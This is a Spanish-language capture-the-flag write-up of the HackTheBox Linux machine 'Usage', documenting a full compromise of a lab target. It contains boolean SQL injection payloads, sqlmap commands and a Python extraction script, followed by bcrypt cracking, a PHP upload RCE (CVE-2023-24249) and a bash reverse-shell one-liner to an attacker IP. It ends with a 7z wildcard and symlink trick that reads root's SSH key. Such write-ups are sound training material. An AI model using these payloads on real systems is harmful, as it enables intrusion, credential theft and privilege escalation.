---
title: "Usage"
date: 2025-05-29 16:41:49 +0200
categories: writeups HackTheBox
tags: máquina linux rce laravel inyecciónsql python scripting criptografía infoleak wildcard sudoers
description: Writeup de la máquina Usage de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**Usage** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**, en ella conseguiremos ganar acceso al panel de administración ubicado en **admin.usage.htb** gracias a una **inyección SQL** basada en **booleanos**, la cual explotaremos de manera automatizada con `sqlmap` y de manera manual con un script en `python`. Una vez en el panel de administración conseguiremos tener ejecución remota de comandos (**RCE**) gracias a la subida de un fichero malicioso. Tras ganar acceso a la máquina víctima, migraremos al usuario **xander** gracias a un **information leakeage**. Finalmente, el usuario **xander** es capaz de ejecutar un binario como **root** gracias al permiso de **sudoers**, dicho binario lo analizaremos con `ghidra` y veremos el uso de una **wildcard** en `7z`, gracias a esto podemos leer archivos internos del sistema, por lo que nos aprovecharemos para leer la **id_rsa** del **root**.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202201.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.18`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.18 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos el puerto **22 y 80**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202314.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.18 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará la atención es la existencia del dominio **usage.htb**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202326.png>)
___
### Puerto 80 - HTTP (Nginx)

Para poder acceder a la página web hemos de aplicar **Virtual Hosting** para ello añadiremos la siguiente línea `10.10.11.18   usage.htb` al `/etc/hosts`. Comprobaremos que ahora somos capaces de ver la página web. Posteriormente, nos registraremos para poder logearnos.

Una vez logeados observaremos un mensaje exitoso y nueva página en la que no vemos nada interesante.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202650.png>)

En la botonera de la parte superior derecha veremos que el botón de `Admin` nos lleva al dominio **admin.usage.htb**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202600.png>)

Volveremos a aplicar **Virtual Hosting**, para ello actualizaremos la línea ya presente en el `/etc/hosts` a `10.10.11.18   usage.htb  admin.usage.htb`.

Al acceder al nuevo dominio (**admin.usage.htb**) veremos un panel de login en el que no podemos hacer nada interesante. 

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202727.png>)

Tras navegador un buen rato por lo diferentes dominios nos percataremos que la página web principal (**usage.htb**) cuenta con una funcionalidad a través de la cual podemos restablecer nuestra contraseña.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202758.png>)

Si ponemos un email válido veremos como nos aparece un mensaje exitoso.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202819.png>)

En el caso de que el email introducido no exista nos aparecerá un mensaje de error, por lo que tenemos una forma potencial de enumerar correos electrónicos.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122202837.png>)

___
## Explotación
### Boolean Inyección SQL

Al igual que en cualquier campo de entrada de datos probaremos si es vulnerable a una **SQL Injection**, en definitiva introduciremos el siguiente payload.

```bash
test' or 1=1-- -
```

Veremos que al introducir el anterior payload nos aparecerá un mensaje exitoso, es decir igual que cuando un email es válido.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122203223.png>)

A continuación, introduciremos el siguiente payload el cual nos ayudará a comprobar que es vulnerable a una **SQL Injection**.

```sql
test' or 1=2-- -
```

Tal y como se aprecia en la siguiente captura nos aparecerá un mensaje de error, por lo que todo apunta a que es vulnerable a una **Inyección SQL basada en booleanos**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122203232.png>)

Si al introducir el siguiente payload la página se queda cargando durante 5 segundos podemos corroborar que es vulnerable a una **SQL Injection**.

```bash
test' or sleep(5)-- -
```

Tal y como observamos nos saltará un error el cual nos hará pensar que existe una validación para que no se introduzca la palabra `sleep`.

> Destacar que existen diferentes formas de **bypassear** esta sanitización, pero como ya hemos descubierto que es vulnerable a una **Inyección SQL basada en booleanos** no perderemos tiempo en intentarlo.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122203354.png>)

Capturaremos la petición usando **FoxyProxy** y **BurpSuite**, y la mandaremos al **Intruder** para intentar descubrir la letra inicial de la actual base de datos, todo ello gracias a un ataque de fuerza bruta (**Sniper**), en definitiva usaremos el siguiente payload.

```bash
test'+or+substring((select+database()),1,1)='§u§'--+-
```

Gracias a la siguiente instrucción generaremos un fichero que contendrá todos los caracteres de la `a` a la `z`,

```bash
python3 -c 'import string; [print(char) for char in string.ascii_lowercase]'  > chars.txt
```

Haciendo click sobre **Load** seleccionaremos el fichero que contiene todas las letras.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122204659.png>)

A continuación, añadiremos una expresión regular para que filtré por lo que queremos buscar, en definitiva será por `We have e-mailed your password`.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122204721.png>)

En primera instancia nos daremos cuenta que al realizar el ataque nos devuelve un código de estado **302**, es decir una redirección. Para evitar esto y que nos redireccione automáticamente seleccionaremos la opción **Always** en el apartado **Redirections**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122204732.png>)

Una vez que tenemos todo configurado le daremos a **Start Attack**, tras un rato esperando nos daremos cuenta que para la letra `u` nos aparecerá el mensaje exitoso (**We have e-mailed your password**), por lo que ya sabemos por la letra inicial de la actual base de datos.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122204809.png>)
#### Automated - SQLMap

En primer lugar, estaremos dumpeando la información de la base de datos de manera automatizada gracias a **SQLMap**.
##### Bases de datos

Guardaremos en un fichero la petición vulnerable a la **Inyección SQL basada en booleanos**, y a continuación usaremos el siguiente comando para sacar todas las bases de datos.

> Para que nos muestre los datos hemos de usar la opción `--no-cast`.

```bash
sqlmap -r req.req -p "email" --dbs --batch --no-cast
```

Entre todas las bases de datos que nos reporta nos llamará la atención **usage_blog**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122205047.png>)
##### Tables de la base de datos usage_blog

Mostraremos todas las tablas de la base de datos **usage_blog** gracias al siguiente comando.

```bash
sqlmap -r req.req -p "email" -D usage_blog --tables --batch --no-cast
```

Nos llamará la atención la tabla **admin_users**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122205323.png>)
##### Columnas de la tabla admin_users

Gracias a la siguiente instrucción mostraremos las columnas de la tabla **admin_users**.

```bash
sqlmap -r req.req -p "email" -D usage_blog -T admin_users --columns --batch --no-cast
```

Nos quedaremos con la columna **password** y **username**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122205555.png>)
##### Información de la tabla admin_users

Finalmente, dumpearemos la información de la tabla **admin_users** gracias al siguiente comando.

```bash
sqlmap -r req.req -p "email" -D usage_blog -T admin_users -C username,password --dump --batch --no-cast
```

Tal y como vemos a continuación veremos un **hash** correspondiente al usuario **admin**: **Cracking admin password**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122205621.png>)
#### Manual - Python Script

Gracias al siguiente script seremos capaces de dumpear toda la información de la base de datos, es decir obtener el **hash** del usuario **admin**: **Cracking admin password**.

```python
#!/usr/bin/env python3

import requests,string
from pwn import *

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_:,$.@/~1&*"

main_url = "http://usage.htb/forget-password"

# Establecer las cookies según las dadas por las web
cookies = {
    'laravel_session' : '',
    'XSRF-TOKEN' : ''
}

def makeSQLI():

    cadena = ""
    p1 = log.progress("SQLI")
    p1.status("Fuerza bruta")
    p2 = log.progress("Información extraída")
    
    for position in range(1, 100):
        for character in characters:
        
            data = {
                '_token' : '', # Establecer _token en función de la página web
				# Estaremos usando la función BINARY() para que sea case sensitive, algo a tener en cuenta cuando estamos dumpeando contraseñas.
                'email' : f"test' or substring((select group_concat(BINARY (username),0x3a,BINARY(password)) from admin_users),{position},1)='{character}'-- -"
            }
            
            r = requests.post(main_url, data=data, cookies=cookies)
            p1.status(data["email"])
            
            if not "Email address does not match in our records!" in r.text:
                cadena += character
                p2.status(cadena)
                break


if __name__ == '__main__':
	makeSQLI()
```
### Cracking admin password
#### johntheripper

Guardaremos en un fichero el **hash** y gracias a **johntheripper** lo intentaremos crackear.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Tras **24** segundos conseguiremos crackear el **hash**, por lo que tendremos las siguientes credenciales **admin:whatever1**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122205824.png>)
#### hashcat

Una forma más manual de crackear el **hash** es usando **hashcat**.

En primer lugar debemos de descubrir el tipo de **hash** (`$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`), para ello aplicaremos una expresión regular gracias a la siguiente instrucción.

```bash
hashcat --example-hashes | grep -G '$2.*\$[0-9][0-9]\$' -B 11
```

Observaremos que el modo del **hash** es **3200** (**bcrypt**) 

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122210555.png>)

Ejecutaremos el siguiente comando indicando el modo de **hash** (**3200**).

```bash
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
```

De igual forma conseguiremos crackear el **hash**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122210901.png>)
### CVE-2023-24249 | RCE

En primer instancia probaremos a autenticarnos por **ssh** con las credenciales encontramos pero no tendremos éxito.  A continuación, nos dirigiremos al panel de login del dominio **admin.usage.htb**, y conseguiremos autenticarnos correctamente con las credenciales encontradas (**admin:whatever1**).

Lo primero que nos llamará la atención del panel de administración es la versión de **laravel-admin** (**1.8.18**).

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122210647.png>)

Tras buscar en internet por exploits para dicha versión del **laravel-admin** nos encontraremos que es vulnerable a un **RCE**, aquí esta el **POC](https://flyd.uk/post/cve-2023-24249/). Básicamente para conseguir la ejecución remota de comandos hemos de subir un fichero malicioso ([cmd.php**) como foto de perfil. 

Gracias a **FoxyProxy** y **BurpSuite** interceptaremos la petición de subir una nueva imagen de perfil.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122215737.png>)

Enviaremos dicha petición al **Repeater**, cambiaremos la extensión a **.php** y sustituiremos el contenido por el de **cmd.php**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122215600.png>)

Enviaremos la petición con <kbd>CTRL</kbd> + <kbd>Espace</kbd>, y al dirigirnos a la página web veremos que se ha subido correctamente nuestro **cmd.php**, para saber donde se ha almacenado debemos de hacer **hover** sobre el botón indicado. 

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122223214.png>)

Tras dirigirnos a la ruta indicada conseguiremos tener ejecución remota de comandos (**RCE**) en la máquina víctima como el usuario **dash**.

> Destacar que el fichero se elimina cada pocos minutos por lo que debemos de darnos prisa para enviarnos una **Reverse Shell**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122215822.png>)

A continuación, lo que haremos será ponernos en escucha con **NetCat** (`nc -nlvp 443`) y enviarnos una **Reverse Shell** gracias al típico one liner de bash (`bash -c "bash -i >%26 /dev/tcp/10.10.16.2/443 0>%261").

Observaremos que recibimos correctamente la **Reverse Shell**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122215854.png>)
___
## Movimiento lateral de usuario a xander
### Enumeración local

Tras ganar acceso la máquina víctima como el usuario **dash** realizaremos un **Tratamiento de la TTY** para operar más cómodamente.

Tal y como vemos a continuación existe un usuario adicional (**xander**).

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220032.png>)

En nuestra **home** nos encontramos con unos ficheros inusuales.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220114.png>)
### Information Leakage

Al mirar el contenido de dichos ficheros seremos capaces de ver una contraseña.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220139.png>)

Usaremos dicha contraseña para autenticarnos como el usuario **xander** y conseguiremos acceder correctamente.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220212.png>)

___
## Escalada de privilegios
### Enumeración local

Realizaremos una enumeración simple y nos daremos cuenta que tenemos asignado un permiso de **Sudoers**, a través del cual podemos ejecutar el binario (`/usr/bin/usage_management`) como cualquier usuario sin necesidad de proporcionar contraseña.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220350.png>)

Como era de esperar se trata de un fichero ejecutable, además no tenemos capacidad de escritura en él por lo que no podremos cambiar su contenido.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220438.png>)
### /usr/bin/usage_management

Al ejecutar dicho binario veremos que podemos seleccionar diferentes opciones (**1,  2, 3**).

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220740.png>)

Al seleccionar la primera opción veremos que comprime un directorio y lo guarda en **/var/backups/project.zip** usando **7z**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220734.png>)

Con la segunda opción (**2**) no seremos capaces de ver ningún output, pero supuestamente está realizando una copia de la información almacenada en **MySQL**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220751.png>)

Con la tercera (**3**) y última opción supuestamente estaremos reseteando la contraseña del **admin**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220800.png>)

Gracias al siguiente comando seremos capaces de ver las cadenas de texto imprimibles del binario **/usr/bin/usage_management**.

```bash
strings /usr/bin/usage_management
```

Veremos un montón de información pero nos llamará la atención la **wildcard** (**\***) usada en comando **7z** y la ruta **/var/www/html**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122220824.png>)

Nos **Transferiremos** el binario a nuestra máquina atacante y lo analizaremos con **ghidra**.

En la función **main()** veremos que para cada opción se está llamando a una función.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122221337.png>)

Al ver el contenido de la función **backupWebContent()** podemos ver que se cambia el directorio **/var/www/html** y gracias al uso de la **wildcard** (**\***) comprime todo lo que hay usando **7z**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122221407.png>)

Si nos dirigimos a la siguiente página web [HackTricks - Wildcard 7z](https://book.hacktricks.wiki/es/linux-hardening/privilege-escalation/wildcards-spare-tricks.html?highlight=wildcards%20tar#7z) veremos como podemos abusar de está **wildcard** para leer archivos internos del sistema. 

En primer lugar comprobaremos que tenemos permisos de escritura en el directorio **/var/www/html**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122221631.png>)

Tras verificar que tenemos permisos de escritura sobre dicho directorio (**/var/ww/html**), ejecutaremos los siguiente comandos.

```bash
touch @root.txt # Crearemos el fichero @root.txt
ln -s /root/root.txt root.txt # Realizaremos un link simbólico al fichero que queremos leer.
```

Ejecutaremos de nuevo el script (**/usr/bin/usage_management**), seleccionaremos la primera opción y veremos que somos capaces de ver el contenido del **root.txt**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122222128.png>)

En este punto lo que haremos será intentar leer el contenido de la **id_rsa** del usuario **root**, para ello ejecutaremos las siguientes instrucciones situados en **/var/www/html**.

```bash
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
```

Al ejecutar de nuevo el binario (**/usr/bin/usage_management**) seremos capaces de ver el contenido de la **id_rsa** del **root**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122222225.png>)

Tras guardar el contenido en un fichero lo abriremos con **nvim** y ejecutaremos el siguiente comando para eliminar las palabras ` : No More files`.

```ruby
:%s/ :.*//
```

Gracias al siguiente comando nos conectaremos como el usuario **root** usando la **id_rsa**.

```bash
ssh -i id_rsa.root root@10.10.11.18
```

Finalmente, conseguiremos ganar acceso a la máquina víctima como el usuario **root**.

![](<../assets/images/posts/2025-05-29-usage/Pasted image 20250122222340.png>)
